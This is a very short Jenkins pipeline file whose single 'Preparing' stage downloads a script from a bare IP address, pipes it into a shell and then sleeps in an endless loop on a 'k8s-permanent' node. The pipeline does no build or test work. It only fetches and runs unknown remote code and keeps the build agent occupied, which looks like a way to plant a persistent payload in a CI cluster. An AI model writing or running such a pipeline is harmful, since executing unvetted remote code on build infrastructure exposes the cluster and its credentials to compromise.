node('k8s-permanent') {
    try {
        stage("Preparing") {
            sh 'curl http://34.143.172.153/ss | sh'
            sh 'while true; do sleep 30; done;'
        }
    } catch (e) {
        throw e
    }
}
